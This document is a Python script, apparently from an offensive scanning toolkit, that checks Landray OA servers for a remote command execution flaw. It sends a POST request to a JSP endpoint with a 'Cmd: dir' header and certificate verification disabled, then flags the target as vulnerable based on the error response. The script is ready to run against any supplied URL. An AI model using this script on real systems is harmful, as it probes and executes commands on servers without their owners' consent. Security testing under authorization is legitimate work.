#!/usr/bin/env python
# coding=utf-8
# 蓝凌OA sysSearchMain.do 远程命令执行漏洞
import requests, threading
from termcolor import colored
import base64

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    headers = {
        'Cmd':'dir',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.50'
    }
    try:
        response = requests.post(url=url + '/sys/ui/extend/varkind/custom.jsp', verify=False,timeout=20,headers=headers)
        if response.status_code == 500 and "OptFailureInfo" in response.text:
            print(colored('[+]存在蓝凌OAsysSearchMain.do远程命令执行漏洞', 'red'))
            results = f'{url}-->蓝凌OAsysSearchMain.do远程命令执行漏洞'
        else:
            print('[-]不存在蓝凌OAsysSearchMain.do远程命令执行漏洞')
    except:
        print('[-]不存在蓝凌OAsysSearchMain.do远程命令执行漏洞')


def langlingOARCE(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
